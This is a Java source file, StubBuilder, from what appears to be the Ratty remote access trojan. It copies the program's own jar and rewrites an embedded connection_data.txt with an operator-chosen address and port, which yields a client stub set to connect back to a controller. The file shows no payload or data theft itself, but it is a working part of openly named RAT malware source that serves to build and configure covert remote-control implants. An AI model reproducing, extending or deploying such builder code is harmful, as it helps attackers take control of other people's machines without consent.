package de.sogomn.rat.builder;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

import javax.swing.JFileChooser;
import javax.swing.JOptionPane;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.Ratty;


public final class StubBuilder {
	
	private static final String ADDRESS_MESSAGE = "Address?";
	private static final String PORT_MESSAGE = "Port?";
	
	private static final String FILE_NAME = "/connection_data.txt";
	
	private StubBuilder() {
		//...
	}
	
	private static File getFileInput(final boolean open) {
		final JFileChooser fileChooser = new JFileChooser();
		final String currentDirectoryPath = System.getProperty("user.dir");
		final File currentDirectory = new File(currentDirectoryPath);
		
		fileChooser.setCurrentDirectory(currentDirectory);
		
		final int input = open ? fileChooser.showOpenDialog(null) : fileChooser.showSaveDialog(null);
		
		if (input == JFileChooser.APPROVE_OPTION) {
			final File file = fileChooser.getSelectedFile();
			
			return file;
		}
		
		return null;
	}
	
	private static File copyJarFile() {
		final File destination = getFileInput(false);
		
		if (destination == null) {
			return null;
		}
		
		try {
			final URI sourceUri = Ratty.class.getProtectionDomain().getCodeSource().getLocation().toURI();
			final File source = new File(sourceUri);
			
			FileUtils.copy(source, destination);
			
			return destination;
		} catch (final URISyntaxException ex) {
			ex.printStackTrace();
			
			return null;
		}
	}
	
	private static void replaceFile(final File jarFile) {
		final String address = JOptionPane.showInputDialog(ADDRESS_MESSAGE);
		
		if (address == null) {
			return;
		}
		
		final String port = JOptionPane.showInputDialog(PORT_MESSAGE);
		
		if (port == null) {
			return;
		}
		
		final String fileContent = address + "\r\n" + port + "\r\ntrue";
		final byte[] data = fileContent.getBytes();
		final ByteArrayInputStream in = new ByteArrayInputStream(data);
		final Path jarFilePath = jarFile.toPath();
		
		try {
			final FileSystem jarFileSystem = FileSystems.newFileSystem(jarFilePath, null);
			final Path fileToReplace = jarFileSystem.getPath(FILE_NAME);
			
			Files.copy(in, fileToReplace, StandardCopyOption.REPLACE_EXISTING);
			
			jarFileSystem.close();
			in.close();
		} catch (final IOException ex) {
			ex.printStackTrace();
		}
	}
	
	public static void start() {
		final File jarFile = copyJarFile();
		
		if (jarFile != null) {
			replaceFile(jarFile);
		}
	}
	
}
